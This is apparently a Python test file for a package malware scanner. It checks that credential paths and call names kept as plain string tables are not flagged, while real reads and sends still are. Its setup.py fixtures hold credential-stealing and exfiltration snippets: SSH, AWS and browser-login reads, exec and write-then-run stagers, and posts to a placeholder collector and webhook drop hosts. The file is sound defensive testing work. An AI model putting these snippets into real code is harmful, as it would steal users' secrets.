"""Call syntax inside a Python string nothing runs is text, not a call (`QuotedPythonCalls`).

```
  a table of call names (`"requests.post(url)"`) beside a credential read       ──► no credential-and-egress
  the same table and a real `requests.post(...)` call                          ──► blocked as ever
  the same table in a file that runs a string as code (`exec`)                 ──► blocked as ever
  a table of credential stores or drop-point hosts only matched against text   ──► not a read, not a sweep
  the same table opened, listed, handed to another module or to a helper       ──► blocked as ever
```
Provenance: every fixture here is benign carrier text written for this file; none is derived from a
corpus unit. The hosts are reserved `.invalid` names.
"""

from __future__ import annotations

import io
import tarfile
from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config

CREDENTIAL_SENT = "MALWARE.EXFIL.001"

TABLE = (
    "import os\n"
    "from setuptools import setup\n"
    "\n"
    "# The calls this guard looks for in a package, written as data.\n"
    "WATCHED_CALLS = (\n"
    '    "requests.post(url, data=payload)",\n'
    '    "urllib.request.urlopen(target)",\n'
    '    "socket.create_connection(address)",\n'
    ")\n"
    'token = os.environ.get("AWS_SECRET_ACCESS_KEY")\n'
)


class Package:
    @staticmethod
    def sdist(tmp_path: Path, setup: str) -> Path:
        info = "Metadata-Version: 2.1\nName: demo-guard\nVersion: 1.0.0\n"
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, text in {
                "demo-guard-1.0.0/PKG-INFO": info,
                "demo-guard-1.0.0/setup.py": setup,
            }.items():
                data = text.encode()
                member_info = tarfile.TarInfo(member)
                member_info.size = len(data)
                archive.addfile(member_info, io.BytesIO(data))
        target = tmp_path / "demo-guard-1.0.0.tar.gz"
        target.write_bytes(buffer.getvalue())
        return target

    @staticmethod
    def sends_a_credential(target: Path) -> bool:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        return any(f.rule_id == CREDENTIAL_SENT for f in result.findings)


class TestACallNamedInAString:
    def test_a_table_of_call_names_beside_a_credential_read_is_not_credential_and_egress(
        self, tmp_path
    ):
        setup = TABLE + "setup(name='demo-guard', version='1.0.0')\n"
        assert not Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_the_same_table_and_a_real_call_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "import requests\n"
            + "requests.post('https://collector.example.invalid/c', data=token)\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_the_same_table_in_a_file_that_runs_a_string_as_code_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "stage = \"import requests; requests.post('https://collector.example.invalid/c', "
            + 'data=token)"\n'
            + "exec(stage)\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))


class TestAStringThatReachesASink:
    """A string is text only while nothing sends it, runs it or writes it out. One written to a
    file and run is the first half of write-then-run, and `InertLiterals` keeps a write a sink for
    the same reason. The first form of the drop read every string of a file that never calls `exec`
    as text, and a malicious unit of the PyPI development half that stages its callback this way
    lost its block (final-tree pair, 2026-11-16, reviews/mcp-98/17)."""

    STAGE = (
        "stage = \"import requests; requests.post('https://collector.example.invalid/c', "
        'data=token)"\n'
    )

    def test_a_string_written_to_a_file_and_run_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "import subprocess, sys\n"
            + self.STAGE
            + "open('stage.py', 'w').write(stage)\n"
            + "subprocess.run([sys.executable, 'stage.py'])\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_a_string_handed_to_an_interpreter_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "import subprocess, sys\n"
            + self.STAGE
            + "subprocess.run([sys.executable, '-c', stage])\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_a_string_handed_to_a_helper_that_writes_it_is_still_blocked(self, tmp_path):
        setup = (
            TABLE
            + "import subprocess, sys\n"
            + "def stash(text):\n"
            + "    with open('stage.py', 'w') as handle:\n"
            + "        handle.write(text)\n"
            + self.STAGE
            + "stash(stage)\n"
            + "subprocess.run([sys.executable, 'stage.py'])\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert Package.sends_a_credential(Package.sdist(tmp_path, setup))

    def test_a_table_that_only_a_loop_reads_is_still_text(self, tmp_path):
        setup = (
            TABLE
            + "for call in WATCHED_CALLS:\n"
            + "    print(len(call))\n"
            + "setup(name='demo-guard', version='1.0.0')\n"
        )
        assert not Package.sends_a_credential(Package.sdist(tmp_path, setup))


class TestAStoreNamedInATableNothingReads:
    """A secret scanner, a redactor or a security tool lists the credential stores of a dozen
    services and the hosts a drop point is known by, as text it matches against what it reads
    (`TextLiterals`). A stealer carries the same strings and opens them. The pattern tier records a
    rule's first match that stands, so a table that is only data is skipped and a read after it is
    still the hit."""

    HEAD = "import os\nimport re\nimport requests\nfrom setuptools import setup\n\n"
    STORES = (
        "STORES = (\n"
        '    "~/.aws/credentials",\n'
        '    "~/.ssh/id_rsa",\n'
        '    "~/.npmrc",\n'
        '    "~/.kube/config",\n'
        '    "~/.docker/config.json",\n'
        ")\n"
    )
    HOSTS = 'HOSTS = ("webhook.site", "pastebin.com", "discord.com/api/webhooks")\n'
    TAIL = (
        "\nrequests.post('https://reports.example.invalid/api', json={'n': 1})\n"
        "setup(name='demo-guard', version='1.0.0')\n"
    )
    MATCHES = (
        "PATTERNS = [re.compile(re.escape(s.replace('~/', ''))) for s in STORES]\n\n"
        "def scan(text):\n"
        "    return [p.pattern for p in PATTERNS if p.search(text)]\n"
    )
    RULES = (
        "MALWARE.EXFIL.001",
        "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001",
        "SUSPECT.EXFIL.CALLBACK.001",
    )

    @classmethod
    def blocked(cls, tmp_path, body: str) -> set[str]:
        target = Package.sdist(tmp_path, cls.HEAD + body + cls.TAIL)
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(target)
        return {f.rule_id for f in result.findings if f.rule_id in cls.RULES}

    def test_a_table_of_stores_the_module_matches_text_against_is_no_credential_read(
        self, tmp_path
    ):
        assert not self.blocked(tmp_path, self.STORES + self.MATCHES)

    def test_a_table_of_stores_and_hosts_only_compared_with_text(self, tmp_path):
        body = (
            self.STORES
            + self.HOSTS
            + "\ndef scan(text):\n    return [p for p in STORES + HOSTS if p in text]\n"
        )
        assert not self.blocked(tmp_path, body)

    def test_the_same_table_opened_in_a_loop_is_still_blocked(self, tmp_path):
        body = (
            self.STORES
            + "\ndef collect():\n    return [open(os.path.expanduser(p)).read() for p in STORES]\n"
        )
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)
        assert "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001" in self.blocked(tmp_path, body)

    def test_the_same_table_read_through_path_is_still_blocked(self, tmp_path):
        body = (
            self.STORES
            + "\nfrom pathlib import Path\ndata = [Path(p).expanduser().read_text() for p in STORES]\n"
        )
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_the_same_table_handed_to_another_module_is_still_blocked(self, tmp_path):
        body = self.STORES + "\nimport helper\nhelper.collect(STORES)\n"
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_the_same_table_handed_to_map_is_still_blocked(self, tmp_path):
        body = self.STORES + "\ncontents = list(map(open, map(os.path.expanduser, STORES)))\n"
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_helper_of_the_file_that_opens_what_it_is_given_is_still_blocked(self, tmp_path):
        body = (
            self.STORES
            + "\ndef read(path):\n    return open(os.path.expanduser(path)).read()\n\n"
            + "token = read(STORES[0])\n"
        )
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_table_first_does_not_hide_a_read_of_another_store_after_it(self, tmp_path):
        body = (
            self.STORES + self.MATCHES + "\ntoken = open(os.path.expanduser('~/.pypirc')).read()\n"
        )
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_table_in_a_file_that_runs_a_string_as_code_is_still_blocked(self, tmp_path):
        body = self.STORES + self.MATCHES + "\nexec('print(1)')\n"
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_host_the_code_sends_to_is_still_a_drop_point(self, tmp_path):
        body = (
            self.STORES
            + self.HOSTS
            + "\nrequests.post('https://' + HOSTS[0], data=open(os.path.expanduser(STORES[0])).read())\n"
        )
        assert "SUSPECT.EXFIL.CALLBACK.001" in self.blocked(tmp_path, body)

    def test_a_host_the_code_fetches_from_is_still_a_drop_point(self, tmp_path):
        body = (
            self.STORES
            + self.HOSTS
            + "\nrequests.get('https://' + HOSTS[0], params={'d': open(os.path.expanduser(STORES[0])).read()})\n"
        )
        assert "SUSPECT.EXFIL.CALLBACK.001" in self.blocked(tmp_path, body)

    def test_a_table_nothing_in_the_file_reads_is_another_modules_to_use(self, tmp_path):
        """A constant written for a sibling module to open or post to is not a table this file matches
        text against, whichever way it is named: `__init__.py` holding the places a stealer reads."""
        body = "STORES = (\n    '~/.aws/credentials',\n    '~/.ssh/id_rsa',\n    '~/.npmrc',\n)\n"
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_function_nothing_in_the_file_calls_keeps_its_literals_live(self, tmp_path):
        body = "def places():\n    return ['~/.aws/credentials', '~/.ssh/id_rsa', '~/.npmrc']\n"
        assert "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001" in self.blocked(tmp_path, body)

    def test_a_class_attribute_table_is_left_to_the_methods_that_read_it(self, tmp_path):
        body = (
            "class Places:\n"
            "    STORES = ['~/.aws/credentials', '~/.ssh/id_rsa', '~/.npmrc']\n"
            "    def read(self):\n"
            "        return [open(os.path.expanduser(p)).read() for p in self.STORES]\n"
        )
        assert "SUSPECT.EXFIL.CREDENTIAL_SWEEP.001" in self.blocked(tmp_path, body)

    def test_a_store_path_built_with_the_path_operator_and_copied_is_still_read(self, tmp_path):
        """`shutil.copy(store, tmp)` takes the store as an argument and reads it: `copy` is a use
        whenever it is given the value (the list and dict method is called with none)."""
        body = (
            "from pathlib import Path\n"
            "import shutil\n"
            "store = Path.home() / '.config' / 'google-chrome' / 'Default' / 'Login Data'\n"
            "shutil.copy(store, '/tmp/ld')\n"
        )
        assert "MALWARE.EXFIL.001" in self.blocked(tmp_path, body)

    def test_a_table_copied_for_its_own_use_is_still_text(self, tmp_path):
        body = self.STORES + "\nCOPY = STORES.copy()\n" + self.MATCHES
        assert not self.blocked(tmp_path, body)
